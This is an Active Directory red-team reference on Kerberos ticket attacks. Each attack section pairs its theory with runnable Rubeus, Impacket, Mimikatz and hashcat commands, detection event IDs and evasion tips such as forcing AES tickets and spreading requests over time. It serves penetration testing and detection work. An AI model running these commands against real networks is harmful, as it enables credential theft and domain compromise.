# Kerberos Attacks Deep Dive

> **MITRE ATT&CK**: Credential Access > T1558 - Steal or Forge Kerberos Tickets
> **Platforms**: Windows
> **Required Privileges**: User (most attacks) / Domain Admin (Golden Ticket forging)
> **OPSEC Risk**: Medium-High

## Strategic Overview

Kerberos is the backbone of AD authentication. Its design -- where any authenticated user
can request service tickets, and ticket validation relies on shared secrets -- creates
inherent attack surface. A Red Team Lead must know every Kerberos attack variant, understand
the underlying protocol mechanics that make each possible, and choose the right technique
based on the operational environment's detection capabilities.

---

## AS-REP Roasting

### Theory
When an account has "Do not require Kerberos pre-authentication" enabled (UAC flag 0x400000),
the KDC returns an AS-REP containing data encrypted with the user's key WITHOUT verifying
the requester knows the password. The encrypted portion can be cracked offline.

### Enumeration
```powershell
# PowerView
Get-DomainUser -PreauthNotRequired | select samaccountname, description

# LDAP filter
(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))

# ADModule
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

### Exploitation
```powershell
# Rubeus (Windows)
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
.\Rubeus.exe asreproast /user:target_user /format:hashcat /outfile:asrep.txt  # Specific user
.\Rubeus.exe asreproast /enctype:aes /format:hashcat   # AES (stealthier, mode 19700)
```
```bash
# Impacket (Linux)
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip DC_IP
GetNPUsers.py domain.local/user:pass -request -format hashcat  # Authenticated enum + roast
```

### Cracking
```bash
hashcat -m 18200 asrep.txt wordlist.txt -r rules/best64.rule   # RC4
hashcat -m 19700 asrep.txt wordlist.txt -r rules/best64.rule   # AES (if /enctype:aes used)
```

### Detection
- **Event ID 4768**: TGT requested with pre-authentication type 0 (no pre-auth)
- Accounts with 0x400000 UAC flag should be monitored
- Volume of 4768 events from a single source for multiple accounts

### Evasion
- Target specific accounts rather than spraying all no-preauth users
- Use AES encryption type to avoid RC4 downgrade detection flags

---

## Kerberoasting

### Theory
Any authenticated domain user can request a TGS (service ticket) for any SPN registered
in the domain. The TGS is encrypted with the service account's long-term key (derived from
its password). If the password is weak, the TGS can be cracked offline to recover the
service account's plaintext password.

### Enumeration
```powershell
# PowerView - find user accounts with SPNs (computer accounts are not useful)
Get-DomainUser -SPN | select samaccountname, serviceprincipalname, description, memberof

# Rubeus - statistics first
.\Rubeus.exe kerberoast /stats
# Shows: user, SPN, supported encryption, password last set date
```

### Exploitation
```powershell
# Rubeus - all SPNs (noisy)
.\Rubeus.exe kerberoast /outfile:tgs.txt /format:hashcat

# Rubeus - target specific high-value account (stealthy)
.\Rubeus.exe kerberoast /user:svc_sql /outfile:tgs.txt /format:hashcat

# Rubeus - force AES encryption (avoids RC4 downgrade detection)
.\Rubeus.exe kerberoast /enctype:aes /outfile:tgs_aes.txt /format:hashcat

# Rubeus - with alternate credentials
.\Rubeus.exe kerberoast /creduser:domain\user /credpassword:pass /outfile:tgs.txt
```
```bash
# Impacket (Linux)
GetUserSPNs.py domain.local/user:pass -request -outputfile tgs.txt -dc-ip DC_IP
GetUserSPNs.py -hashes :NTLM_HASH domain.local/user -request -outputfile tgs.txt
```

### Targeted Kerberoasting (Requires GenericAll/GenericWrite on User)
```powershell
# Set SPN on target that has no SPN
Set-DomainObject -Identity target_admin -Set @{serviceprincipalname='fake/spn.domain.local'}

# Kerberoast them
.\Rubeus.exe kerberoast /user:target_admin /outfile:tgs.txt

# Clean up - remove the SPN
Set-DomainObject -Identity target_admin -Clear serviceprincipalname
```

### Cracking
```bash
hashcat -m 13100 tgs.txt wordlist.txt -r rules/best64.rule   # RC4 (etype 23)
hashcat -m 19600 tgs.txt wordlist.txt -r rules/best64.rule   # AES128 (etype 17)
hashcat -m 19700 tgs.txt wordlist.txt -r rules/best64.rule   # AES256 (etype 18)
```

### Detection
- **Event ID 4769**: Service ticket requested -- watch for RC4 encryption (0x17) when AES
  is available, high volume from single source, tickets for sensitive SPNs
- **Honey SPN accounts**: Fake SPNs that alert when a TGS is requested
- Kerberos encryption downgrade alerts (RC4 request when account supports AES)

### Evasion
- Use `/enctype:aes` to request AES-encrypted tickets (matches normal traffic)
- Target one or two high-value SPNs instead of mass roasting
- Spread requests over time
- Kerberoast from different source hosts if possible

---

## Unconstrained Delegation

### Theory
When a computer is configured for unconstrained delegation (UAC flag 0x80000), it stores the
user's full TGT in memory when they authenticate to it. If an attacker compromises that
computer, they can extract any cached TGTs and impersonate those users.

### Discovery
```powershell
# PowerView (exclude DCs which always have unconstrained delegation)
Get-DomainComputer -Unconstrained | ?{$_.name -notmatch "DC"} | select dnshostname

# ADModule
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
```

### Exploitation -- Wait for TGT
```powershell
# Monitor for incoming TGTs on compromised unconstrained delegation host
.\Rubeus.exe monitor /interval:5 /nowrap /filteruser:administrator

# Extract and use when a high-value TGT arrives
.\Rubeus.exe ptt /ticket:doIFMj...
```

### Exploitation -- Force Authentication (Printer Bug / SpoolSample)
```powershell
# Coerce DC to authenticate to our unconstrained delegation host
.\SpoolSample.exe dc01.domain.local unconstrained-host.domain.local

# The DC's TGT will be cached on unconstrained-host
# Extract with Rubeus
.\Rubeus.exe monitor /interval:1 /nowrap /filteruser:DC01$
```
```bash
# PetitPotam coercion (from Linux)
python3 PetitPotam.py unconstrained-host-ip dc01-ip

# Printerbug.py
python3 printerbug.py domain.local/user:pass@dc01-ip unconstrained-host-ip
```

### Detection
- **Event ID 4624**: Logon with delegation flag set
- Monitor for unexpected TGT forwarding patterns
- SpoolSample/PetitPotam coercion creates named pipe connections (Sysmon Event 18)
- Network signatures for MS-RPRN and MS-EFSR abuse

### Evasion
- Avoid targeting DCs directly for coercion if possible
- Use less-monitored coercion methods (DFSCoerce, ShadowCoerce)
- Blend TGT extraction with normal service operations on the host

---

## Constrained Delegation (S4U)

### Theory
Constrained delegation uses two Kerberos extensions:
- **S4U2Self**: A service requests a ticket to itself on behalf of a user (even if the
  user never authenticated to it). Returns a forwardable service ticket.
- **S4U2Proxy**: Using the ticket from S4U2Self, the service requests a ticket to a
  specific target service on behalf of the user.

The target services are specified in `msDS-AllowedToDelegateTo`.

### Discovery
```powershell
# PowerView
Get-DomainComputer -TrustedToAuth | select dnshostname, msds-allowedtodelegateto
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto

# ADModule
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

### Exploitation
```powershell
# If you have the constrained delegation account's hash/key
# Rubeus S4U chain to impersonate administrator to allowed service
.\Rubeus.exe s4u /user:svc_sql /rc4:NTLM_HASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt

# With AES key (stealthier)
.\Rubeus.exe s4u /user:svc_sql /aes256:AES_KEY /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt

# Alternative SPN (the service name in the ticket can be changed)
.\Rubeus.exe s4u /user:svc_sql /rc4:HASH /impersonateuser:administrator /msdsspn:time/target.domain.local /altservice:cifs,ldap,http /ptt
```
```bash
# Impacket
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/svc_sql -hashes :NTLM_HASH -dc-ip DC_IP
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@target.domain.local
```

### Detection
- **Event ID 4769**: S4U2Proxy requests show delegation in ticket options
- Monitor accounts with constrained delegation for unusual S4U patterns
- Unexpected service ticket requests from delegation accounts

---

## Resource-Based Constrained Delegation (RBCD)

### Theory
Unlike traditional constrained delegation (configured on the front-end service), RBCD is
configured on the **target** (back-end) service via `msDS-AllowedToActOnBehalfOfOtherIdentity`.
If an attacker has write access to a computer object, they can configure RBCD to allow a
computer they control to impersonate any user to that target.

### Requirements
1. Write access to the target computer object (GenericWrite, GenericAll, WriteDacl, etc.)
2. A computer account with an SPN (create one via MAQ -- MachineAccountQuota, default 10)

### Attack Flow
```powershell
# Step 1: Create a computer account (or use one you already control)
New-MachineAccount -MachineAccount FAKECOMP -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# Step 2: Get the SID of the new computer
$ComputerSid = Get-DomainComputer FAKECOMP -Properties objectsid | Select -Expand objectsid

# Step 3: Configure RBCD on target computer
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject -Identity TARGET_COMPUTER -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Step 4: S4U attack from the fake computer to impersonate admin on target
.\Rubeus.exe hash /password:Password123! /user:FAKECOMP$ /domain:domain.local
.\Rubeus.exe s4u /user:FAKECOMP$ /rc4:COMPUTED_HASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```
```bash
# Impacket flow
addcomputer.py -computer-name 'FAKECOMP$' -computer-pass 'Password123!' domain.local/user:pass
rbcd.py -delegate-from 'FAKECOMP$' -delegate-to 'TARGET$' -action write domain.local/user:pass
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/'FAKECOMP$':'Password123!' -dc-ip DC_IP
```

### Cleanup
```powershell
Set-DomainObject -Identity TARGET_COMPUTER -Clear 'msds-allowedtoactonbehalfofotheridentity'
```

---

## Diamond Tickets

### Theory
Unlike Golden Tickets (forged from scratch, never issued by the KDC), Diamond Tickets start
with a **legitimate TGT** obtained from the DC, then modify its PAC to include elevated
privileges. This makes detection significantly harder because the ticket has valid KDC
metadata and timestamps.

### Exploitation
```powershell
# Requires KRBTGT AES key
.\Rubeus.exe diamond /krbkey:AES256_KRBTGT_KEY /user:regular_user /password:pass /enctype:aes /ticketuser:administrator /domain:domain.local /dc:dc01.domain.local /ptt

# With explicit target
.\Rubeus.exe diamond /krbkey:AES256_KEY /user:regular_user /password:pass /enctype:aes /ticketuser:administrator /domain:domain.local /dc:dc01 /groups:512 /ptt
```

### Why Diamond > Golden for OPSEC
- The TGT was legitimately issued by the KDC (has valid KDC signature metadata)
- Ticket timestamps are realistic (issued at actual time, not backdated)
- Does not require creating a ticket for a non-existent user
- Encryption type matches the domain default (AES)
- Event 4768 (AS-REQ) exists in the DC logs for the underlying legitimate request

---

## Silver Tickets

### Theory
A Silver Ticket is a forged TGS (service ticket) created using the service account's NTLM
hash. It never touches the KDC, providing direct access to a specific service.

### Exploitation
```powershell
# Mimikatz - forge Silver Ticket for CIFS (file share access)
kerberos::golden /domain:domain.local /sid:S-1-5-21-DOMAIN_SID /target:server.domain.local /service:cifs /rc4:SERVICE_NTLM_HASH /user:administrator /ptt

# For other services
/service:http       # Web services, WinRM
/service:ldap       # LDAP operations on DCs (DCSync with Silver Ticket)
/service:host       # Scheduled tasks, WMI
/service:mssql      # SQL Server access
```
```bash
# Impacket
ticketer.py -nthash SERVICE_NTLM_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/server.domain.local administrator
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@server.domain.local
```

### Detection
- Silver Tickets skip the KDC, so **no Event 4769** on the DC for this ticket
- PAC validation (if enabled) will fail because the KDC never signed the PAC
- Unusual service ticket encryption types or lifetimes
- Sysmon and local service logs on the target server may show anomalies

---

## Detection Summary

| Attack | Key Event IDs | Detection Signal |
|--------|--------------|-----------------|
| AS-REP Roast | 4768 | Pre-auth type 0, multiple targets |
| Kerberoast | 4769 | RC4 downgrade (etype 0x17), high volume |
| Unconstrained Deleg | 4624 | Delegation flag, coercion traffic |
| Constrained Deleg | 4769 | S4U ticket options, unusual delegation |
| RBCD | 5136 | msDS-AllowedToActOnBehalfOfOtherIdentity modified |
| Golden Ticket | 4769 | Non-existent user, etype downgrade, lifetime anomaly |
| Diamond Ticket | 4768+4769 | Very hard -- PAC inspection, group mismatch |
| Silver Ticket | None on DC | No DC event, PAC validation failure |

---

## Cross-References

- [AD Fundamentals](./ad-fundamentals.md) -- Kerberos protocol details
- [AD Attack Path Methodology](./ad-attack-path-methodology.md) -- Where these fit in the kill chain
- [ADCS Attacks](./adcs-attacks.md) -- Certificate-based Kerberos auth (PKINIT)
- [AD Persistence](./ad-persistence-deep-dive.md) -- Golden/Diamond/Silver Tickets as persistence

---

## References

- [harmj0y: Roasting series](https://harmj0y.net/blog/activedirectory/)
- [Will Schroeder: Kerberos Delegation](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
- [Elad Shamir: Wagging the Dog (RBCD)](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [Charlie Clark: Diamond Tickets](https://www.semperis.com/blog/a-diamond-in-the-ruff/)
- [Sean Metcalf: AD Attack and Defense](https://adsecurity.org/?p=2293)
- [Rubeus Documentation](https://github.com/GhostPack/Rubeus)
